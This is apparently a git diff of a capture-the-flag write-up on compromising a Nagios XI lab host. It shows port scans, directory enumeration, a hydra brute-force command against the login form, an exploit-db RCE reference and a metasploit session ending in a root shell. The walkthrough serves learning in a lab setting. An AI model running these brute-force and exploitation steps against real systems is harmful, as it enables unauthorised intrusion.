@@ -1,7 +1,7 @@
 ### Nagios_XI_writeup 
 
 ### 1. Firstly added the ip to hosts
-<pre>
+<pre style="background:black;color:green;">
 
 192.168.49.126  my.addr
 192.168.126.136 hack.thm
@@ -19,7 +19,7 @@ ff02::2    ip6-allrouters
 
 <h3><b>rustscan-results</b></h3>
 
-<pre>
+<pre style="background:black;color:green;">
 ┌[linspace]─[14:27-10/08]─[/home/sp1d3y]
 └╼sp1d3y$rustscan -a hack.thm
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -75,7 +75,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
 </pre>
 
 <h3><b>nmap-results</b></h3>
-<pre>
+<pre style="background:black;color:green;">
 ┌[linspace]─[14:27-10/08]─[/home/sp1d3y]
 └╼sp1d3y$nmap -A -sV -p 22,25,80,389,443,5667 hack.thm 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 14:27 IST
@@ -120,7 +120,7 @@ Nmap done: 1 IP address (1 host up) scanned in 24.08 seconds
 
 
 <h3>Meanwhile I Did Directory Enumeration</h3>
-<pre>
+<pre style="background:black;color:green;">
 ***********
 ┌[linspace]─[14:32-10/08]─[/home/sp1d3y]
 └╼sp1d3y$dirb http://hack.thm
@@ -151,7 +151,7 @@ GENERATED WORDS: 4612
 </pre>
 
 <h3>I further enumerated directories</h3>
-<pre>
+<pre  style="background:black;color:green;">
 ┌[linspace]─[14:37-10/08]─[/home/sp1d3y]
 └╼sp1d3y$dirb http://hack.thm/nagiosxi/ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
 
@@ -182,12 +182,12 @@ GENERATED WORDS: 81628
 ^C> Testing: http://hack.thm/nagiosxi/1427  
 </pre>
 
-<h3><b>But i didn't got the lead so ("directory enum")</b></h3>
+<h3><b>But didn't got the lead so...</b></h3>
 
 
-<h3><b>I tried to brute force that login form</b></h3>
+<h3><b>Tried to brute force that login form</b></h3>
 
-<pre>
+<pre style="background:black;color:green;">
 ┌[linspace]─[15:42-10/08]─[/home/sp1d3y]
 └╼sp1d3y$ hydra hack.thm http-post-form '/nagiosxi/login.php:username=^USER^&password=^PASS^:login' -L user.txt -P /usr/share/wordlists/rockyou.txt -t 64
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -242,15 +242,16 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-10 15:44:
 </pre>
 
 <h3>But none of these credentials worked may be bcuz i did something wrong in command</h3>
-<h3>Then i looked at nmap scan again and looked for other ports but didn't find good stuff</h3>
+<h3>Then, Looked at nmap scan again and looked for other ports but didn't find good stuff</h3>
 
 
 
 <h3>Then i tried for finding any exploit for nagiosxi service that i found on port 80</h3> 
 <h3>I found an RCE ("https://www.exploit-db.com/exploits/48191")</h3>
-###then opened the metasploit and searched for this rce in metasploit database
-********************************
 
+<h3>Then opened the metasploit and searched for this rce in metasploit database</h3>
+
+<pre>
 ┌[linspace]─[14:26-10/08]─[/home/sp1d3y]
 └╼sp1d3y$msfconsole -q
 [msf](Jobs:0 Agents:0) >> search nagios
@@ -352,6 +353,6 @@ Process 12073 created.
 Channel 1 created.
 whoami
 root
-*****************
+</pre>
 
 
